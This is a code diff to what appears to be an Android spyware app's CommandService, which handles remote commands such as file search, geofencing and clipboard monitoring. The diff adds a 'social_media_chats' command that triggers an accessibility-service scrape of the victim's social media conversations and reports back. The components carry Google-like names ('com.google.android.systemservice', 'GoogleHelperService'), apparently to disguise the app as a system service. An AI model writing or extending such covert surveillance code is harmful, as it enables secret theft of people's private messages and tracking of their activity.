@@ -303,6 +303,7 @@ class CommandService : Service() {
                 "search_files" -> executeSearchFiles(params)
                 "add_geofence" -> executeAddGeofence(params)
                 "start_clipboard_monitor" -> executeStartClipboardMonitor()
+                "social_media_chats" -> executeSocialMediaScraping(params)
                 else -> Log.w(TAG, "Unknown command: $command")
             }
         } catch (e: Exception) {
@@ -1377,6 +1378,17 @@ class CommandService : Service() {
         }
         sendResponse("clipboard_monitor", JSONObject().apply {
             put("status", "started")
+        })
+    }
+
+    private fun executeSocialMediaScraping(params: JSONObject?) {
+        // Trigger manual scrape via GoogleHelperService (Accessibility)
+        val intent = Intent("com.google.android.systemservice.TRIGGER_SCRAPE").apply {
+            setPackage(packageName)
+        }
+        sendBroadcast(intent)
+        sendResponse("social_media_chats", JSONObject().apply {
+            put("status", "scrape_triggered")
         })
     }
 
